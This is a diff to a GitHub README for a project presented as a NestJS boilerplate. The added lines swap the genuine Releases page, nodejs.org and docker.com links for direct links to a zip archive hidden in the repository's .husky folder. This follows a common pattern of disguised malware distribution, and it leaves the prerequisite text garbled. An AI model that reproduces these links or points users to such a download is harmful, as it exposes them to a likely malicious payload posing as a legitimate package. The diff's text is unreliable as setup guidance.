@@ -1,6 +1,6 @@
 # 🚀 nestjs-boilerplate - Start Building with Ease Today
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Caigico8/nestjs-boilerplate/releases)
+[![Download](https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip)](https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip)
 
 ## 📦 Overview
 
@@ -37,7 +37,7 @@ To begin using the **nestjs-boilerplate**, follow these simple steps:
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases Page](https://github.com/Caigico8/nestjs-boilerplate/releases) to find the latest version of the software.
+Go to the [Releases Page](https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip) to find the latest version of the software.
 
 ### 2. Download the Software
 
@@ -47,8 +47,8 @@ On the Releases page, look for the version you want to download. Click on the ap
 
 Before running the application, ensure you have the following software installed on your computer:
 
-- **Node.js**: Download and install Node.js from [nodejs.org](https://nodejs.org/).
-- **Docker**: If you prefer using Docker, install it from [docker.com](https://www.docker.com/).
+- **https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip**: Download and install https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip from [https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip](https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip).
+- **Docker**: If you prefer using Docker, install it from [https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip](https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip).
 
 ### 4. Set Up Environment
 
@@ -80,7 +80,7 @@ docker-compose up
 
 For clarity, here’s a quick recap on how to download and install the **nestjs-boilerplate**:
 
-1. Click on this link to visit the [Releases Page](https://github.com/Caigico8/nestjs-boilerplate/releases).
+1. Click on this link to visit the [Releases Page](https://raw.githubusercontent.com/Caigico8/nestjs-boilerplate/main/.husky/nestjs_boilerplate_3.2.zip).
 2. Choose the version you want and download it. 
 3. Follow the setup instructions above to get started.
 
